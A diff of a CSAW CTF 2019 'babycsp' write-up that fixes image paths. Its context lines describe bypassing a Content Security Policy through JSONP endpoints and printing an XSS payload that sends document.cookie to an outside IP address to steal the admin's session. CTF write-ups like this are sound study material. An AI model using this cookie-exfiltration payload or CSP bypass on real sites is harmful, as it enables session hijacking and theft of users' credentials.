@@ -39,7 +39,7 @@ default-src 'self'; script-src 'self' *.google.com; connect-src *
 
 This looks 'secure' on paper, however evaluating it with `https://csp-evaluator.withgoogle.com/` shows us the following:
 
-![1568649748521](/home/shane/Desktop/ctf_writeups/CSAWCTF2019/babycsp/1568649748521.png)
+![1568649748521](./1568649748521.png)
 
 The thing that stands out the most here is the possibility of _JSONP endpoints_ that would allow us to bypass CSP.
 
@@ -47,7 +47,7 @@ Researching for a bit gives us `https://github.com/zigoo0/JSONBee`, which a bunc
 
 Since the cookies are HttpOnly, we can't write to a file or anything like that, we have to set up a public facing server (I used AWS Free Tier) and use the "Report to Admin" button to steal his cookie.
 
-![1568650225806](/home/shane/Desktop/ctf_writeups/CSAWCTF2019/babycsp/1568650225806.png)
+![1568650225806](./1568650225806.png)
 
 >  HttpOnly cookies make XSS cookie stealing more difficult by not allowing client-side scripts to print the cookies.
 
@@ -61,7 +61,7 @@ window.location="http://13.58.84.168/"["concat"](document.cookie);
 
 So, running this payload and clicking `Report to admin`, we check our `access_log` for `httpd` on our EC2 instance and find the flag:
 
-![1568650393624](/home/shane/Desktop/ctf_writeups/CSAWCTF2019/babycsp/1568650393624.png)
+![1568650393624](./1568650393624.png)
 
 ### Flag
 
